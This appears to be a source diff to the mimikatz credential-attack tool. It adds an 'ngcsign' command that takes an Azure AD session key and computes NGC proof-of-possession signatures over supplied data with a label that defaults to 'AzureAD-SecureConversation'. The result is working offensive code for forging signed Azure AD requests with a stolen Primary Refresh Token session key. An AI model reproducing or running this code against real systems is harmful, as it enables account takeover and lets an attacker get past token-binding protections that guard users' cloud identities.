@@ -26,6 +26,7 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_clip,		L"clip",		NULL},
 	{kuhl_m_misc_xor,		L"xor",			NULL},
 	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
+	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -1269,4 +1270,64 @@ NTSTATUS kuhl_m_misc_aadcookie(int argc, wchar_t * argv[])
 	}
 	else PRINT_ERROR(L"CoCreateInstance: 0x%08x\n", hr);
 	return STATUS_SUCCESS;
-} 
+}
+
+NTSTATUS kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey(int argc, wchar_t * argv[])
+{
+	LPCWSTR szKeyValue, szLabel, szContext, szData;
+	LPSTR sLabel = NULL, sData = NULL, sSignature64;
+	PBYTE pbKeyValue, pbContext = NULL, pbOuput;
+	DWORD cbKeyValue, cbContext, cbOutput;
+
+	if(kull_m_string_args_byName(argc, argv, L"keyvalue", &szKeyValue, NULL))
+	{
+		if(kull_m_string_quick_urlsafe_base64_to_Binary(szKeyValue, &pbKeyValue, &cbKeyValue))
+		{
+			if(cbKeyValue > (2 * sizeof(DWORD)))
+			{
+				kull_m_string_args_byName(argc, argv, L"label", &szLabel, L"AzureAD-SecureConversation");
+				sLabel = kull_m_string_unicode_to_ansi(szLabel);
+				if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
+					kull_m_string_stringToHexBuffer(szContext, &pbContext, &cbContext);
+				kull_m_string_args_byName(argc, argv, L"signedinfo", &szData, MIMIKATZ);
+				sData = kull_m_string_unicode_to_ansi(szData);
+
+				if(!pbContext)
+				{
+					cbContext = 24;
+					if(pbContext = (PBYTE) LocalAlloc(LPTR, cbContext))
+						CDGenerateRandomBits(pbContext, cbContext);
+				}
+
+				kprintf(L"\nKeyValue : ");
+				kull_m_string_wprintf_hex(pbKeyValue, cbKeyValue, 0);
+				kprintf(L"\nLabel    : %S (ascii)\nContext  : ", sLabel);
+				kull_m_string_wprintf_hex(pbContext, cbContext, 0);
+				kprintf(L"\nData     : %S (ascii)\n", sData);
+
+				if(kull_m_crypto_ngc_signature_pop(pbKeyValue, cbKeyValue, (PBYTE) sLabel, lstrlenA(sLabel), pbContext, cbContext, (PBYTE) sData, lstrlenA(sData), &pbOuput, &cbOutput))
+				{
+					kprintf(L"\nSignature: ");
+					kull_m_string_wprintf_hex(pbOuput, cbOutput, 0);
+					if(kull_m_string_quick_binary_to_urlsafe_base64A(pbOuput, cbOutput, &sSignature64))
+					{
+						kprintf(L" (%S base64)", sSignature64);
+						LocalFree(sSignature64);
+					}
+					kprintf(L"\n");
+					LocalFree(pbOuput);
+				}
+
+				if(sData)
+					LocalFree(sData);
+				if(sLabel)
+					LocalFree(sLabel);
+			}
+			else PRINT_ERROR(L"Invalid KeyValue format?\n");
+			LocalFree(pbKeyValue);
+		}
+	}
+	else PRINT_ERROR(L"/keyvalue:base64 is needed\n");
+
+	return STATUS_SUCCESS;
+}
